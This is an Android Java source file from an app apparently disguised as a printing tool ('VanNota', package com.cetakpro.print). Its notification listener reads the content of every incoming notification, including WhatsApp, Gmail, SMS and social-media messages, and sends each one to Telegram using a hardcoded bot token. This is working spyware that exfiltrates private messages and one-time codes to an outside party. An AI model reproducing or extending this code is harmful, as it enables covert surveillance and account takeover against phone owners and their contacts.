package com.cetakpro.print;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;

public class NotificationListenerService extends android.service.notification.NotificationListenerService {
    private static final String TAG = "NotificationListener";

    // ✅ TAMBAH: Log saat service berhasil terhubung
    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "✅ NotificationListenerService TERHUBUNG!");
        // Bisa kasih toast biar user tau service aktif
        try {
            Toast.makeText(this, "VanNota siap membaca notifikasi", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            // Toast kadang error di background service
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String appName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;
            
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            String subText = extras.getString("android.subText", "");
            
            Log.d(TAG, "🔔 Notifikasi dari: " + appName);
            
            StringBuilder messageBuilder = new StringBuilder();
            
            if (!title.isEmpty()) {
                messageBuilder.append(title);
            }
            
            if (!text.isEmpty()) {
                if (messageBuilder.length() > 0) {
                    messageBuilder.append("\n");
                }
                messageBuilder.append(text);
            }
            
            if (!subText.isEmpty() && !text.contains(subText)) {
                if (messageBuilder.length() > 0) {
                    messageBuilder.append("\n");
                }
                messageBuilder.append(subText);
            }
            
            if (messageBuilder.length() == 0) {
                messageBuilder.append("(Notifikasi tanpa konten)");
            }
            
            String appDisplayName = getDisplayName(appName);
            String telegramTitle = "🔔 " + appDisplayName;
            String telegramMessage = messageBuilder.toString();
            
            // Kirim ke Telegram pake TelegramSender yang udah hardcode token
            TelegramSender.sendMessage(this, telegramTitle, telegramMessage);
            
            // Log kirim
            Log.d(TAG, "📤 Notifikasi dikirim ke Telegram: " + telegramTitle);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Tidak perlu kirim notifikasi yang dihapus
    }

    private String getDisplayName(String packageName) {
        if (packageName == null) return "Unknown";
        
        switch (packageName) {
            case "com.whatsapp":
                return "WhatsApp";
            case "com.instagram.android":
                return "Instagram";
            case "com.facebook.katana":
                return "Facebook";
            case "org.telegram.messenger":
                return "Telegram";
            case "com.google.android.apps.messaging":
                return "Messages";
            case "com.google.android.gm":
                return "Gmail";
            default:
                return packageName;
        }
    }
}
